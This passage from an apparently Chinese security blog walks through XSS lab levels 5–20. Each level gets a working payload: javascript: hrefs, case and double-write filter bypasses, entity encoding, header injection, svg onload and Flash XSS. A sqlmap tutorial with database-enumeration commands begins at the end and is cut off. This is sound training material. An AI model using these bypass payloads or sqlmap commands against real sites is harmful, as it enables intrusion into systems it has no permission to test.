2024-03-19 103721"></p><p>发现被转义了 此路行不通哪就换一条</p><p>用html事件试一下payload：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-string">&quot;onmouseover=alert(&#x27;xss&#x27;);&quot;</span><br></code></pre></td></tr></table></figure><p>发现结果一样on也被转义</p><p>最后发现大小写绕过也不行</p><p>因为可以完成闭合所以在这里我们可以用其他标签html中的<a> herf</p><p><code>href</code> 属性的值可以是任何有效文档的相对或绝对 URL，包括片段标识符和 JavaScript 代码段。如果用户选择了 <a> 标签中的内容，那么浏览器会尝试检索并显示 <code>href</code> 属性指定的 URL 所表示的文档，或者执行 JavaScript 表达式、方法和函数的列表</p><p>具体可以参考<a href="https://www.w3school.com.cn/tags/att_a_href.asp#google_vignette">https://www.w3school.com.cn/tags/att_a_href.asp#google_vignette</a></p><p>因为herf属性的值可以是javascript然后构造payload：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">javascript:alert(</span>&#x27;<span class="hljs-attr">xss</span>&#x27;)&gt;</span>点一下我试试<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>&quot;<br></code></pre></td></tr></table></figure><p>在构造payload的时候第一要注意闭合还有是href最后在这里一定要加上javascript:</p><p>因为如果不加我们在href后的东西有可能被解析为url导致点击后跳转到404页面</p><p>最后结果如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-19%20111003.png" alt="屏幕截图 2024-03-19 111003"></p><h2 id="Level-6"><a href="#Level-6" class="headerlink" title="Level 6"></a>Level 6</h2><p>在这一关没有过滤" < 但是on herf script 均被转义最后试试大写能不能不被转义</p><p>payload：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">SCRipt</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;xss&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">Script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240319113106089.png"></p><p>其实以上几关的payload把被转义的部分小写变成大写均可以实现xss以上只是其中的一个例子</p><h2 id="Level-7"><a href="#Level-7" class="headerlink" title="Level 7"></a>Level 7</h2><p>老样子先来试试他过滤了什么如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-19%20155428.png" alt="屏幕截图 2024-03-19 155428"></p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-19%20155433.png" alt="屏幕截图 2024-03-19 155433"></p><p>由图可知以上的方法的关键字符均被过滤 然后我又试了大写绕过发现不行</p><p>但是如果他直接删掉的话我们可以通过双写来绕过</p><p>payload：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-string">&quot;oonnmouseover=alert(&#x27;xss&#x27;);&quot;</span><br></code></pre></td></tr></table></figure><p>如图：</p><p><img src="C:\Users\35358\AppData\Roaming\Typora\typora-user-images\image-20240319163609324.png" alt="image-20240319163609324"></p><p>以上只是一个例子以上的代码均可实现双写绕过</p><h2 id="Level-8"><a href="#Level-8" class="headerlink" title="Level 8"></a>Level 8</h2><p>在第八关有两个点可以利用一个是input标签另一个是href的属性</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240319171415580.png" alt="image-20240319171415580"></p><p>如图发现它实体化了 " 因此input标签闭合这条路便走不通了但是从图中可知它将javascript转义然后我也试了一下大写绕过发现也不行这时候就需要用到一个新知识了</p><h3 id="新知识："><a href="#新知识：" class="headerlink" title="新知识："></a>新知识：</h3><p>href隐藏属性：可以进行自动Unicode解码</p><p>Unicode编码解码工具：<a href="https://www.matools.com/code-convert-unicode">https://www.matools.com/code-convert-unicode</a></p><p>payload：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">javascript</span>:<span class="hljs-function"><span class="hljs-title">alert</span>(<span class="hljs-string">&#x27;xss&#x27;</span>)</span><br></code></pre></td></tr></table></figure><p>Unicode编码后</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-symbol">&amp;#106;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#118;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#115;</span><span class="hljs-symbol">&amp;#99;</span><span class="hljs-symbol">&amp;#114;</span><span class="hljs-symbol">&amp;#105;</span><span class="hljs-symbol">&amp;#112;</span><span class="hljs-symbol">&amp;#116;</span><span class="hljs-symbol">&amp;#58;</span><span class="hljs-symbol">&amp;#97;</span><span class="hljs-symbol">&amp;#108;</span><span class="hljs-symbol">&amp;#101;</span><span class="hljs-symbol">&amp;#114;</span><span class="hljs-symbol">&amp;#116;</span><span class="hljs-symbol">&amp;#40;</span><span class="hljs-symbol">&amp;#39;</span><span class="hljs-symbol">&amp;#120;</span><span class="hljs-symbol">&amp;#120;</span><span class="hljs-symbol">&amp;#115;</span><span class="hljs-symbol">&amp;#39;</span><span class="hljs-symbol">&amp;#41;</span><br></code></pre></td></tr></table></figure><p>输入回车如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240319172734822.png" alt="image-20240319172734822"></p><h2 id="Level-9"><a href="#Level-9" class="headerlink" title="Level 9"></a>Level 9</h2><p>在这一关看了一下页面源代码貌似和上一关没有什么不同</p><p>在input标签中" 和 < 均被实体化</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240319214641087.png" alt="image-20240319214641087"></p><p>但是当我随便输入一些内容时发现如果输入的不是有效地址而是javascript代码时它压根就不会读如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240319173748470.png" alt="image-20240319173748470"></p><p>那到底怎么才算合法不知道可以选择去瞅瞅后端源代码</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240319215105481.png" alt="image-20240319215105481"></p><p>因此需要我们构造的payload后面增加</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/*http:/</span><span class="hljs-regexp">/*/</span><br></code></pre></td></tr></table></figure><p>即可</p><p>Unicode编码解码工具：<a href="https://www.matools.com/code-convert-unicode">https://www.matools.com/code-convert-unicode</a></p><p>但是我们注意要在http://加上注释否则会导致我们输入的javascript代码无法正常发挥作用</p><p>所以payload：</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">&amp;#<span class="hljs-number">106</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">118</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">115</span>;&amp;#<span class="hljs-number">99</span>;&amp;#<span class="hljs-number">114</span>;&amp;#<span class="hljs-number">105</span>;&amp;#<span class="hljs-number">112</span>;&amp;#<span class="hljs-number">116</span>;&amp;#<span class="hljs-number">58</span>;&amp;#<span class="hljs-number">97</span>;&amp;#<span class="hljs-number">108</span>;&amp;#<span class="hljs-number">101</span>;&amp;#<span class="hljs-number">114</span>;&amp;#<span class="hljs-number">116</span>;&amp;#<span class="hljs-number">40</span>;&amp;#<span class="hljs-number">39</span>;&amp;#<span class="hljs-number">120</span>;&amp;#<span class="hljs-number">115</span>;&amp;#<span class="hljs-number">115</span>;&amp;#<span class="hljs-number">39</span>;&amp;#<span class="hljs-number">41</span>;<span class="hljs-comment">/*http://*/</span><br></code></pre></td></tr></table></figure><h3 id="注意：-1"><a href="#注意：-1" class="headerlink" title="注意："></a>注意：</h3><p>1.必须要把注释掉的http放到最后，建议以后养成把注释放到语句最后面的习惯</p><p>（因为不同的解析器可能会先去解码但是我们的注释在unicode编码的前面这样可能会导致我们的注释起不了作用——仅代表个人理解）</p><ol start="2"><li></li></ol><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">为什么把javascript:alert(<span class="hljs-string">&#x27;xss&#x27;</span>)<span class="hljs-regexp">/*http:/</span><span class="hljs-regexp">/*/</span>直接unicode编码不行<br></code></pre></td></tr></table></figure><p>因为href属性中unicode解码是发生在用户点击链接向浏览器发起请求的时候</p><p>并不是说我们传的参数到后端已经解码了</p><p>它会直接把unicode编码后的内容传给后端这样后端就无法识别到http://从而导致xss失败</p><h2 id="HTML事件发挥作用的前提"><a href="#HTML事件发挥作用的前提" class="headerlink" title="HTML事件发挥作用的前提"></a>HTML事件发挥作用的前提</h2><p><strong>需要写在html文件的<script>的标签中或者作为html标签属性的值即在<>里边</strong></p><p>这个比较重要做题前需要先搞清楚这个</p><h2 id="Level-10"><a href="#Level-10" class="headerlink" title="Level 10"></a>Level 10</h2><p>进入这关发现并不存在输入框发现是通过改url get传参然后看看" >是否被实体化</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240320154611729.png" alt="image-20240320154611729"></p><p>由图可知 " > 均被实体化这就导致我们在h2标签中无法使用<script>标签来完成xss而且根据我们传入的参数的位置也无法利用html来实现xss</p><p>但是根据上图发现它还藏起来了三个input标签可以去试试看能不能传入参数</p><p>尝试发现前两个标签不行但是最后那个t_sort可以然后经过输入发现它过滤了<>这就使我们不能去使用script标签那我就利用HTML事件但是还需要一个输入框否则无法触发 这还需要闭合一下</p><p>payload：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">t_sort</span>=<span class="hljs-string">&quot;onmouseover=alert(&#x27;xss&#x27;) type=&quot;</span>text<br></code></pre></td></tr></table></figure><p>type的作用是让输入框显示出来</p><p>原理：</p><p>当input标签中有两个type属性时那么html解析器会只解析第一个属性这样便可以让type="hidden"失效从而显现出来输入框</p><p>使用其他html事件也可以</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240320192528221.png" alt="image-20240320192528221"></p><h2 id="Level-11"><a href="#Level-11" class="headerlink" title="Level 11"></a>Level 11</h2><p>在这关发现在h2标签中同样进行了html实体化</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240320200424216.png" alt="image-20240320200424216"></p><p>看到页面源代码后发现有藏起来的input标签然后一个个试看看哪个能够输入试了一圈发现只有t_sort可以但是当我去输入 " > 发现都被过滤如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240320200828495.png" alt="image-20240320200828495"></p><p>因此说明get传参这条路走不通（没办法了缺乏经验我去看看后端代码）</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240320201151444.png" alt="image-20240320201151444"></p><p>发现其实t_ref其实也可以获得参数但是是从referer头里获取 可以去试试burp改包</p><p>发现这道题把<>过滤了我们可以试试html事件</p><p>payload：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-string">&quot;onmouseover=alert(&#x27;xss&#x27;) type=&quot;</span><span class="hljs-built_in">text</span><br></code></pre></td></tr></table></figure><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-20%20202231.png" alt="屏幕截图 2024-03-20 202231"></p><p>然后发包</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240320202257465.png" alt="image-20240320202257465"></p><h2 id="Level-12"><a href="#Level-12" class="headerlink" title="Level 12"></a>Level 12</h2><h3 id="新知识：User-Agent-头"><a href="#新知识：User-Agent-头" class="headerlink" title="新知识：User-Agent 头"></a>新知识：User-Agent 头</h3><p>User-Agent 头通常包含了以下信息：</p><ul><li>浏览器名称和版本号</li></ul><ul><li>操作系统名称和版本号</li><li>用户代理类型（例如，是一个桌面浏览器、移动浏览器还是爬虫）</li><li>其他可选的信息，如硬件类型、渲染引擎等</li></ul><p>进入到这关后先看看页面源代码</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240320203159179.png" alt="image-20240320203159179"></p><p>很明显最后一个input标签的value属性是User-Agent 头</p><p>直接抓包一样发现过滤了 <> 那就和上一关一样用html事件</p><p>payload：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-string">&quot;onmouseover=alert(&#x27;xss&#x27;) type=&quot;</span><span class="hljs-built_in">text</span><br></code></pre></td></tr></table></figure><p>把包中的user-agent头改成payload即可</p><p>发包后如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-20%20203716.png" alt="屏幕截图 2024-03-20 203716"></p><h2 id="Level-13"><a href="#Level-13" class="headerlink" title="Level 13"></a>Level 13</h2><p>老样子先看看页面源代码</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240320210041241.png" alt="image-20240320210041241"></p><p>一眼看到这个提示根据cook猜测是Cookie那就打开控制台瞅瞅如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240320210259262.png" alt="image-20240320210259262"></p><p>嘿嘿果然是那就改它payload：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-string">&quot;onfocus=alert(&#x27;xss&#x27;) type=&quot;</span><span class="hljs-built_in">text</span><br></code></pre></td></tr></table></figure><p>这里的onfocus我只是换了html事件而已目的和onmouseover是一样的</p><p>改完后刷新一下即可如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240320210551614.png" alt="image-20240320210551614"></p><h2 id="Level-14"><a href="#Level-14" class="headerlink" title="Level 14"></a>Level 14</h2><p>跳转的网站没了就没做</p><h2 id="Level-15"><a href="#Level-15" class="headerlink" title="Level 15"></a>Level 15</h2><p>老样子瞅瞅页面源代码</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-20%20214117.png" alt="屏幕截图 2024-03-20 214117"></p><h3 id="新知识：ng-include指令"><a href="#新知识：ng-include指令" class="headerlink" title="新知识：ng-include指令"></a>新知识：ng-include指令</h3><p>ng-include指令就是文件包涵的意思，用来包涵外部的html文件，如果包涵的内容是地址，需要加引号</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240320215303527.png" alt="image-20240320215303527"></p><p>然后我们可以直接利用第一关的漏洞进行xss</p><p>但是当我使用<script>标签时不行结果看了一眼页面源代码发现它过滤了<></p><p>因此可以选择不需要用到<>的一关即可 呃还过滤了""</p><p> 对比发现，这里有个html实体化函数在，没有删掉东西，所以不影响我们接下来的操作，我们可以包涵第一关并让第一关弹窗（注意，这里不能包涵那些直接弹窗的东西如<script>，但是可以包涵那些标签的东西比如<a>、<input>、<img>、<p>标签等等，这些标签是能需要我们手动点击弹窗的），这里我们使用img标签，可参考XSS常见的触发标签，构造payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">?src=&#x27;./level1.php?name=<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onmouseover</span>=<span class="hljs-string">alert()</span>&gt;</span>&#x27;<br></code></pre></td></tr></table></figure><p>注意传参数其实是分开的</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&#x27;./level1.php?name=<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onmouseover</span>=<span class="hljs-string">alert()</span>&gt;</span>&#x27;<br></code></pre></td></tr></table></figure><p>这部分是传到第15关中了而</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">name</span>=&lt;img <span class="hljs-attribute">src</span>=1 <span class="hljs-attribute">onmouseover</span>=alert()&gt;<br></code></pre></td></tr></table></figure><p>这部分是传到第一关的后端了</p><p>我建议这一关不要直接使用<script>标签来直接弹窗可能会不成功</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-20%20220920.png" alt="屏幕截图 2024-03-20 220920"></p><h2 id="Level-16"><a href="#Level-16" class="headerlink" title="Level 16"></a>Level 16</h2><p>先看页面源代码如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240321085130061.png" alt="image-20240321085130061"></p><p>发现输入的内容在<center>中先看看过滤了什么</p><p>输入：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">?keyword=&quot; &#x27; sRc DaTa OnFocus OnmOuseOver OnMouseDoWn P <span class="hljs-tag">&lt;<span class="hljs-name">sCriPt</span>&gt;</span><span class="language-handlebars"><span class="language-xml"> <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">hReF</span>=<span class="hljs-string">javascript:alert()</span>&gt;</span> <span class="hljs-symbol">&amp;#106;</span> </span></span><br></code></pre></td></tr></table></figure><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240321085501294.png" alt="image-20240321085501294"></p><p>由图可知 空格 单双引号均被实体化还会把所有的大写字母转化为小写</p><p>没啥思路可以去看看后端代码如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240321090013724.png" alt="image-20240321090013724"></p><p>发现还过滤了/可以去看看这里边符合要求的标签（不能有script / 空格 单双引号） [xxs常见的触发标签](<a href="https://blog.csdn.net/LYJ20010728/article/details/116462782">XSS常见的触发标签_xss< img src onerror=alt=''+document.domain>”怎么触发-CSDN博客</a>)</p><p>空格可以使用回车的url编码来替代</p><p>payload：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;svg%<span class="hljs-attribute">0aonload</span>=alert(1)&gt;<br></code></pre></td></tr></table></figure><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240321090716362.png" alt="image-20240321090716362"></p><h2 id="Level-17"><a href="#Level-17" class="headerlink" title="Level 17"></a>Level 17</h2><p>先看页面源代码来确定输入的东西在哪个位置</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-21%20091509.png" alt="屏幕截图 2024-03-21 091509"></p><p>然后看看它过滤了什么输入：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">?arg01=&quot; &#x27; sRc DaTa OnFocus OnmOuseOver OnMouseDoWn P <span class="hljs-tag">&lt;<span class="hljs-name">sCriPt</span>&gt;</span><span class="language-handlebars"><span class="language-xml"> <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">hReF</span>=<span class="hljs-string">javascript:alert()</span>&gt;</span>; &amp;arg02=&quot; &#x27; sRc DaTa OnFocus OnmOuseOver OnMouseDoWn P <span class="hljs-tag">&lt;<span class="hljs-name">sCriPt</span>&gt;</span><span class="language-handlebars"><span class="language-xml"> <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">hReF</span>=<span class="hljs-string">javascript:alert()</span>&gt;</span>;</span></span></span></span><br></code></pre></td></tr></table></figure><p>发现<> 和""不行</p><p>不知道embed标签的可以去查查</p><p>发现str属性后的xsf01.swf是一个flash动画文件所以要到一个支持flash的浏览器上这个动画文件才能正常显现出来如果不想下载这个插件的话我们可以去后端把xsf01.swf改成index.png（和这关的php文件在同一文件夹下的png图片均可）</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-21%20093252.png" alt="屏幕截图 2024-03-21 093252"></p><p>因为<> 和""不行所以选择使用html事件payload 1：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?arg01= onclick&amp;<span class="hljs-attribute">arg02</span>=alert()<br></code></pre></td></tr></table></figure><p>这样构造的原因是因为我发现在刚开始传入两个参数的时候中间会加上一个等号然后传入这两个参数到后端就会构造出完整的onclick事件onclick=alert()如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-21%20123302.png" alt="屏幕截图 2024-03-21 123302"></p><p>或者payload 2：?arg02= onlick=alert()</p><p>注意：要在onclick的前面加上一个空格这样才不会和src的属性连在一起</p><p>payload 1和2的结果分别如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-21%20122824.png" alt="屏幕截图 2024-03-21 122824"></p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-21%20123520.png" alt="屏幕截图 2024-03-21 123520"></p><p><strong>此题还有一个点在开始的时候困了我好久：对于<embed>标签可能有些浏览器不支持当paylaod没问题的时候可以换个浏览器试试</strong></p><h2 id="Level-18"><a href="#Level-18" class="headerlink" title="Level 18"></a>Level 18</h2><p>先来瞅瞅页面源代码发现还是有一个flash文件先和上一关一样改一下然后试试看他过滤了什么</p><p>一样先测试一波看看它过滤了什么</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">?arg02=&quot; &#x27; sRc DaTa OnFocus OnmOuseOver OnMouseDoWn P <span class="hljs-tag">&lt;<span class="hljs-name">sCriPt</span>&gt;</span><span class="language-handlebars"><span class="language-xml"> <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">hReF</span>=<span class="hljs-string">javascript:alert()</span>&gt;</span>;</span></span><br></code></pre></td></tr></table></figure><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-21%20133626.png" alt="屏幕截图 2024-03-21 133626"></p><p>发现和上一关一样过滤了 "" <> 直接构造payload：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?a</span>rg01= onclick&amp;arg02=alert(<span class="hljs-string">&#x27;xss&#x27;</span>)<br></code></pre></td></tr></table></figure><p>如图:</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-21%20133528.png" alt="屏幕截图 2024-03-21 133528"></p><h2 id="Level-19"><a href="#Level-19" class="headerlink" title="Level 19"></a>Level 19</h2><p>一样瞅瞅页面源代码如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-21%20133838.png" alt="屏幕截图 2024-03-21 133838"></p><p>发现还是一样的这关我选择去用一下flash可以去给Google装个flash插件即可图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-03-21%20135354.png" alt="屏幕截图 2024-03-21 135354"></p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240321142806174.png" alt="image-20240321142806174"></p><p>一样先试试他过滤了啥</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">?arg02=&quot; &#x27; sRc DaTa OnFocus OnmOuseOver OnMouseDoWn P <span class="hljs-tag">&lt;<span class="hljs-name">sCriPt</span>&gt;</span><span class="language-handlebars"><span class="language-xml"> <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">hReF</span>=<span class="hljs-string">javascript:alert()</span>&gt;</span>;</span></span><br></code></pre></td></tr></table></figure><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240321142951526.png" alt="image-20240321142951526"></p><p>发现和上一关一样</p><p>试试：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?a</span>rg01= onclick&amp;arg02=alert(<span class="hljs-string">&#x27;xss&#x27;</span>)<br></code></pre></td></tr></table></figure><p>发现这关使用了双引号但是我们无法进行闭合</p><p>这关用到的是Flash Xss注入，可参考</p><p><a href="https://blog.csdn.net/u014029795/article/details/103213877">Level 19 Flash XSS</a>与<a href="https://blog.csdn.net/weixin_30702413/article/details/99326627">Flash XSS 漏洞详解</a></p><p>其实就是往Flash里面插入一段js代码，然后手动执行</p><p>构造payload ：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">arg01</span>=version&amp;arg02=&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;javascript:alert()&quot;</span>&gt;here&lt;/a&gt;<br></code></pre></td></tr></table></figure><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240321143915164.png" alt="image-20240321143915164"></p><h2 id="Level-20"><a href="#Level-20" class="headerlink" title="Level 20"></a>Level 20</h2><p>这关也是有双引号仍然需要反编译</p><p>参考<a href="https://blog.csdn.net/u014029795/article/details/103217680">Level 20 Flash XSS</a></p><p>直接构建payload：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">?arg01=id<span class="hljs-meta">&amp;arg02=xss\&quot;))&#125;catch(e)&#123;alert(1)&#125;<span class="hljs-comment">//%26width=123%26height=123</span></span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>xss</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqlmap的使用</title>
    <link href="/2024/04/25/sqlmap%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2024/04/25/sqlmap%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="sqlmap的使用"><a href="#sqlmap的使用" class="headerlink" title="sqlmap的使用"></a>sqlmap的使用</h1><h2 id="Sqlmap-URL-检测"><a href="#Sqlmap-URL-检测" class="headerlink" title="Sqlmap URL 检测"></a>Sqlmap URL 检测</h2><p>sqlmap直接对单一的url探测，参数使用-u或–url</p><p>payload：<code>sqlmap -u &quot;http://192.168.10.1/sqlilabs/sqli-labs-php7-master/Less-1/?id=1&quot; --banner</code></p><p><strong>注意：</strong>如果进入这个页面要先登录那么就需要把cookie带上</p><p><code>sqlmap -u &quot;test.dvwa.com/vulnerabilities/sqli/?Submit=Submit&amp;id=1&quot; --cookie=&quot;PHPSESSID=q1addgmk7rq4u9elognarqt96r; security=low&quot; --banner</code></p><p><strong>注意：在虚拟机上运行此命令的时候要把原来的127.0.0.1变为本机对应虚拟机的ip 192.168.10.1</strong>如图：</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202404232127039.png" alt="image-20240423212734889"></p><p>–banner是用来获得取目标数据库其版本信息以及其他相关信息</p><p>然后就ok了 如图：</p><p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202404242019404.png" alt="屏幕截图 2024-04-24 201850"></p><p>由上图可知此题存在四种注入方式</p><p>分别是：布尔盲注，报错注入，延时注入，联合查询</p><h2 id="sql注入常用指令："><a href="#sql注入常用指令：" class="headerlink" title="sql注入常用指令："></a>sql注入常用指令：</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">sqlmap<span class="hljs-selector-class">.py</span> -u “注入地址” <span class="hljs-attr">--dbs</span> <span class="hljs-comment">// 列举数据库</span><br>sqlmap<span class="hljs-selector-class">.py</span> -u “注入地址” <span class="hljs-attr">--current-db</span> <span class="hljs-comment">// 当前数据库</span><br>sqlmap<span class="hljs-selector-class">.py</span> -u “注入地址” <span class="hljs-attr">--users</span> <span class="hljs-comment">// 列数据库的用户</span><br>sqlmap<span class="hljs-selector-class">.py</span> -u “注入地址” <span class="hljs-attr">--current</span>–user <span class="hljs-comment">// 当前用户</span><br>sqlmap<span class="hljs-selector-class">.py</span> -u “注入地址” -D <span class="hljs-string">&quot;指定数据库&quot;</span> <span class="hljs-attr">--tables</span><span class="hljs-comment">// 